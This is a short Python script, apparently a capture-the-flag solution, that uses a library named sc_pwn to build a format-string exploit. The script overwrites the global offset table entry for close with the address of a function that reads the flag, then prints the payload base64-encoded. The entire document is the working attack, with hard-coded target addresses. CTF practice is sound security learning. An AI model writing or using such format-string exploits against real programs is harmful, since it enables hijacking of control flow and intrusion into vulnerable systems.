from sc_pwn import *
from base64 import b64encode

addr_got_close  = 0x08049c80
addr_read_flag  = 0x08048867

fsb = FSB(size=2)
fsb.set_adrval(addr_got_close, addr_read_flag)
fsb.auto_write(index=7)
print b64encode(fsb.get())
